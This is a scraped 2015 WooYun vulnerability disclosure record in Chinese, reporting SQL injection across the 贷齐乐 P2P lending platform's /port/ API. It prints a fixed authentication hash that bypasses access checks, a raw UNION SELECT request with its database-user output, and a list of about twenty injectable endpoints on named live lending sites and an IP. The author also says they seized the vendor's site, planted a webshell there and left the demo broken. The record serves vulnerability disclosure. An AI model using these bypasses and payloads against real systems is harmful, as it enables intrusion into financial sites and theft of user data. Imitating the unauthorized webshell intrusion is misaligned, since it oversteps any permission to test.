{"id": 66874, "wybug_id": "wooyun-2015-0132687", "wybug_title": "贷齐乐某处设计缺陷导致大面积注入(案例测试)", "wybug_corp": "chinaanhe.com", "wybug_author": "′雨。", "wybug_date": "2015-08-10 10:54", "wybug_open_date": "2015-11-08 11:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-08：\t细节向公众公开  简要描述： 可怕, 都没wb玩众测了, 看这个厂商还在上首页大概看一眼, 赚点wb。无需登录。直接出数据。P.S. 直接把官网拿了, 一进去就看到一个大大的wooyun.php  在代码审计的时候 没代码 就直接在官网上调试代码。。 调试着发现我的马儿突然404了。。   不知道是乌云的小伙伴给我删了 还是管理给我删了。  然后因为我添加的测试代码我自己来得及删除, 导致现在demo都打不开了, 官网可以自己改回去一下,或者联系我帮改一下。 详细说明：  port目录下 首先随便看这目录下的这个文件/port/limitApp.php\ninclude(\"../core/config.inc.php\");include(\"ch_json_encode.php\");include_once(\"../modules/borrow/borrow.class.php\");/* ¶î¶ÈÉêÇë * 2014Äê1ÔÂ20ÈÕ 10:20:57   ÎéÐûÓî * ´«Èë²ÎÊý£ºÓÃ»§ID£ºuser_id ¶î¶È£ºaccount ÉêÇëÀàÐÍ£ºtype ÉêÇëÄÚÈÝ£ºcontent  ±¸×¢£ºremark * ·µ»Ø²ÎÊý£ºapp_status³É¹¦1  app_statusÊ§°Ü0 app_statusÒ»ÔÂºó-1 app_statusÒ»ÔÂºó-2 */global $mysql;$ssql = \"select * from `{system}` where nid='con_phonecode'\";$system = $mysql->db_fetch_array($ssql);$ctstr=md5($system['value']);//md5if($_REQUEST['dcode']!==$ctstr){ // 这里验证了一下 查询出来的echo \"¸ÃÒ³ÎÞ·¨ÏÔÊ¾£¡\";   exit;}$data['account'] = $_REQUEST['account'];$data['content'] = $_REQUEST['content'];$data['type'] = $_REQUEST['type'];$data['remark'] = $_REQUEST['remark'];$data['user_id'] = $_REQUEST['user_id'];$result = borrowClass::GetAmountApplyOne(array(\"user_id\" => $data['user_id'], \"type\" => $data['type']));if ($result != false && $result['verify_time'] + 60 * 60 * 24 * 30 > time()) {  $return_json['app_status'] = -1;} elseif ($result != false && $result['addtime'] + 60 * 60 * 24 * 30 > time() && $result['status'] == 2) {  $return_json['app_status'] = -2;\n这里对查询出来的 MD5进行了验证本来我还以为是随机的 结果是固定的。。所有的都是shoujimd5然后再进行md5一次 得到 7d5372bbcd6cc79f1bd71211f092622e我们先测试一下demo直接访问 http://121.40.166.230:10021/port/setPassword.php返回 该页无法显示！再访问 http://121.40.166.230:10021/port/setPassword.php?dcode=7d5372bbcd6cc79f1bd71211f092622e返回  {\"set_status\":\"-1\"}说明过了这个验证 为了说明这个是固定的 再找几个官网上的成功案例测试一下http://chinaanhe.com/anli/index.html 来到官网的成功案例来找http://www.6scf.com/port/setPassword.php?dcode=7d5372bbcd6cc79f1bd71211f092622ehttp://www.qianyouzc.com/port/setPassword.php?dcode=7d5372bbcd6cc79f1bd71211f092622ehttp://www.bjwfund.com/port/setPassword.php?dcode=7d5372bbcd6cc79f1bd71211f092622e都返回了  并没有错误 说明是成功的 是固定的再继续看代码\n$data['account'] = $_REQUEST['account'];$data['content'] = $_REQUEST['content'];$data['type'] = $_REQUEST['type'];$data['remark'] = $_REQUEST['remark'];$data['user_id'] = $_REQUEST['user_id'];$result = borrowClass::GetAmountApplyOne(array(\"user_id\" => $data['user_id'], \"type\" => $data['type']));\nhttp://www.pjjr658.com//port/limitApp.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=x数字型的  无视GPC了MySQL错误信息：Unknown column 'x' in 'where clause'执行SQL语句错误!select p1.*,p2.username from `dw_user_amountapply` as p1 left join `dw_user` as p2 on p1.user_id=p2.user_id where 1=1 and p1.user_id=x order by p1.id desc再继续看getLinkageOne.php\n$ssql = \"select * from `{system}` where nid='con_phonecode'\";$system = $mysql->db_fetch_array($ssql);$ctstr=md5($system['value']);if($_REQUEST['dcode']!==$ctstr){echo \"该页无法显示！\";exit;}$_sql = \" where 1=1 \";if (isset($_REQUEST['id']) && $_REQUEST['id'] != \"\") {  $_sql .= \" and p1.id = '{$_REQUEST['id']}'\";}if (isset($_REQUEST['value']) && $_REQUEST['value'] != \"\") {  $_sql .= \" and p1.value = '{$_REQUEST['value']}'\";}$sql = \"select p1.id,p1.type_id,p1.name,p1.value from {linkage} as p1 \t\t\t\tleft join {linkage_type} as p2 on p1.type_id=p2.id\t\t\t\t{$_sql}  order by p1.order desc,p1.id\";\n因为这request获取的是request url  导致了我们直接在浏览器中提交被urlencode所以换burp提交把POST ///port/getLinkageOne.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&id=1' and 0 union select 1,current_user,3,4# HTTP/1.1Host: www.pjjr658.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateProxy-Connection: keep-aliveCookie: PHPSESSID=jjc6csk3leb1163n4ckggolsm4Content-Length: 12name=xxx返回HTTP/1.1 200 OKServer: nginx/1.4.1Date: Sat, 08 Aug 2015 07:58:10 GMTContent-Type: text/html;charset=GB2312Connection: keep-aliveContent-Length: 62[{\"id\":\"1\",\"type_id\":\"root@localhost\",\"name\":\"3\",\"value\":\"4\"}]大面积注入 剩下的就不分析了/port/limitApp.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=xhttp://121.40.166.230:10021/port/setUserinfo.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=x/port/setAuto.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=1x/port/login.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&username=xx'&password=xxxGET /port/cashCancel.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=a' HTTP/1.1/port/setUserBank.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=xGET /port/cashNew.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=a' HTTP/1.1/port/setPassword.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=x'GET /port/delAuto.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&id=a' HTTP/1.1/port/setMessage.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&id=x'&type=/port/delFriend.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&friend_username=a'/port/delMessage.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&sent_user=a'http://121.40.166.230:10021/port/tender.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=1asd/port/userreg.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&username=a'http://121.40.166.230:10021/port/tenderLiuzhuan.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&user_id=x'/port/sentMessage.php?dcode=7d5372bbcd6cc79f1bd71211f092622e&receive_user=x'给个地址 不分析了   漏洞证明：  如上。   修复方案：  随机生成加intval?   版权声明：转载请注明来源 ′雨。@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-08-10 11:16 厂商回复： 感谢测试 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-10 10:56 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:798 漏洞数:99        )\t\t \n  膜拜！    \n     2015-08-10 11:04 |    \t\tanswer \t\t\t( 普通白帽子  |\t\t\t        Rank:367 漏洞数:47        | 答案)\t\t \n  膜拜！    \n     2015-08-10 11:04 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:465 漏洞数:110        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  高产 贷齐乐的漏洞都是首页啊    \n     2015-08-10 11:16 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1246 漏洞数:191        | Only Code Never Lie To Me.)\t\t \n   ， 审核都不看漏洞的留言吗？   都留言了说别通过了 哎。。    \n     2015-08-10 11:23 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:166 漏洞数:45        )\t\t \n  膜拜！     \n     2015-08-10 11:25 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:465 漏洞数:110        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  有钱    \n     2015-08-10 11:35 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:191        | 。)\t\t \n  233333333    \n     2015-08-10 11:51 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1362 漏洞数:219        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  雨神也玩众测，让不让人活了....    \n     2015-08-10 11:57 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  雨神也玩众测，让不让人活了.... 能把我分配和小学生一组？    \n     2015-08-13 14:29 |    \t\t路人癸 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 随意路过)\t\t \n  官网是不是被人玩坏了。。    \n     2015-08-16 09:34 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:15        | 呵呵)\t\t \n  ID为何这么相似    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}